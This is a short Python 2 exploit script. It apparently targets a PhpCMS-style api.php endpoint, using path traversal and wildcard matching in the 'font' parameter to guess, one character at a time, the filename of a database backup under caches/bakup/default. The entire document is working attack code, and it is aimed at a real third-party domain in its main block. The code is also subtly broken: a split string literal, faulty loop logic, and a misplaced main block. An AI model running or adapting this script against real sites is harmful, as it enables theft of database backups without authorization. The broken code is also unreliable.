#coding=utf-8
#from http://www.moonsec.com/post-826.html
import urllib2
def check(url):  
  mark = True  
  req = urllib2.Request(url)    
  req.add_header('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')    
  response = urllib2.urlopen(req)    
  content = response.read()    
  if 'Cannot' in content:        
      mark = False    
  return mark
  
def guest(target):    
    arr = []    
    num = map(chr, range(48, 58))    
    alpha = map(chr, range(97, 123))    
    exploit = '%s/api.php?
    op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/%s%s<<.sql'
    
    while True:        
       for char in num:            
        if check(exploit % (target, ''.join(arr), char)):               
           arr.append(char)                
           continue        
           
        if len(arr) < 20:            
            for char in alpha:                 
                 if check(exploit % (target, ''.join(arr), char)):                    
                     arr.append(char)                    
                     continue        
                
        elif len(arr) == 20:            
              arr.append('_db_')        
              
        elif len(arr)== 29:            
              arr.append('_1.sql')            
              break        
              
        if len(arr) < 1:            
            print '[*]not find!'            
            return    
            
        print '[*]find: %s/caches/bakup/default/%s' % (target, ''.join(arr))
        
    if __name__ == "__main__":    
        url = 'http://security.douyu.com'    
        #test    
        guest(url)
